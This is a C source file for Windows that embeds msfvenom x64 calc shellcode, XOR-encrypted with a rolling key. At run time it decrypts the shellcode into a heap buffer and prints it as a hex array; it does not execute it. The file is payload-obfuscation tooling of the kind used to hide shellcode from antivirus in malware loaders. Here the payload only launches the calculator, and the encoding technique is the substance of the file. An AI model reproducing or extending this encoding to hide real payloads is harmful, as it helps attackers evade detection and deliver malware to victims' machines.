// This code only provides the shellcode not the encoded string and all the decryption string 
// The XOREncodeer is the code where string is encrypted with a reference key and decrypted back to the original state by theXOR algorithm
#include <Windows.h>
#include <stdio.h>

// Encryption / Decryption XOR function
VOID XorByiKeys(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey) {

	for (size_t i = 0; i < sShellcodeSize; i++) {

		pShellcode[i] = pShellcode[i] ^ (bKey + i); // XOREncoding Algo. (A ^ B = C and B ^ C = A ) {x=x^y}
	}
}

// Printing the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

// Encrypted Msfvenom x64 calc shellcode 
unsigned char EncShellcode[] = {
		0x0D, 0xBA, 0x70, 0x10, 0x05, 0x1E, 0x37, 0xF8, 0xF9, 0xFA, 0xBA, 0xAD, 0xBC, 0xAE, 0xAD, 0x51,
		0x57, 0x4A, 0x32, 0xD6, 0x60, 0x4E, 0x8C, 0x5A, 0x69, 0x42, 0x80, 0x5E, 0x15, 0x46, 0x84, 0x42,
		0x31, 0x5A, 0x98, 0x66, 0x45, 0x5E, 0x18, 0xAF, 0x53, 0x50, 0x56, 0x2D, 0xD4, 0x56, 0x2E, 0xE0,
		0x8D, 0x1E, 0x42, 0x58, 0x27, 0x0A, 0x07, 0x69, 0xE8, 0xE3, 0x26, 0x6D, 0x2C, 0xEF, 0xCD, 0xDD,
		0x63, 0x73, 0x62, 0x7C, 0xBE, 0x64, 0x17, 0xB3, 0x7B, 0x06, 0x73, 0x3D, 0xED, 0xB5, 0xBF, 0xC8,
		0x41, 0x42, 0x43, 0x0C, 0xC0, 0x86, 0x33, 0x2F, 0x01, 0x4B, 0x9B, 0x1C, 0xC6, 0x06, 0x57, 0x14,
		0xDA, 0x12, 0x73, 0x1D, 0x54, 0x86, 0xB4, 0x0E, 0x11, 0xA5, 0x92, 0x1D, 0xD6, 0x6A, 0xD7, 0x28,
		0x60, 0xB4, 0x2E, 0x55, 0xAC, 0x2E, 0x56, 0xA8, 0xC5, 0x2B, 0xAA, 0xA5, 0x60, 0x2F, 0x6E, 0xB1,
		0x49, 0x92, 0x06, 0x85, 0x39, 0x75, 0x3B, 0x5C, 0x71, 0x3F, 0x42, 0xAD, 0x08, 0xA6, 0x27, 0xC4,
		0x0A, 0xC2, 0xA7, 0xCD, 0x84, 0x56, 0xE1, 0xC9, 0x02, 0x86, 0xC3, 0xC8, 0x06, 0xCE, 0x93, 0xD9,
		0x90, 0x42, 0xD2, 0x1F, 0x91, 0x1E, 0xDF, 0x99, 0x49, 0xDB, 0xC3, 0xDD, 0xC5, 0xC0, 0xC6, 0xFA,
		0xE0, 0xFA, 0xE2, 0xFD, 0xE4, 0xFC, 0xEF, 0x2B, 0x45, 0x8A, 0xEA, 0xFE, 0x52, 0x4E, 0xF7, 0xF1,
		0xE8, 0xE8, 0xFB, 0x3F, 0xA7, 0x5F, 0xE0, 0x47, 0x46, 0x45, 0xE6, 0xF4, 0x07, 0xBF, 0xBF, 0xC0,
		0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0x8E, 0x4A, 0x45, 0xC8, 0xCB, 0xCB, 0xCC, 0x8C, 0x74, 0xFE, 0x5B,
		0xBE, 0x55, 0x2C, 0x01, 0x6E, 0x36, 0xCA, 0xF2, 0xD3, 0x9B, 0x61, 0x7A, 0x48, 0x63, 0x42, 0x1F,
		0x34, 0xAA, 0x60, 0x20, 0xCD, 0xDA, 0xE1, 0x94, 0xE3, 0x6A, 0x10, 0x0C, 0x98, 0xEB, 0x54, 0xB7 };


int main() {
	// Printing the address of the shellcode
	printf("[i] shellcode : 0x%p \n", EncShellcode);
	printf("[#] Press <Enter> To Decrypt ...");
	getchar();

	// Allocating buffer to hold decrypted shellcode
	PBYTE DecryptedShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(EncShellcode));
	if (DecryptedShellcode)
		memcpy(DecryptedShellcode, EncShellcode, sizeof(EncShellcode));

	// Decryption
	XorByiKeys(DecryptedShellcode, sizeof(EncShellcode), 0xF1); //Reference Key 

	// Printing the decrypted buffer
	PrintHexData("Shellcode", DecryptedShellcode, sizeof(EncShellcode));

	// Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, DecryptedShellcode);

	// Exit
	printf("[#] Press <Enter> To Quit ...");
	getchar();
	return 0;
}
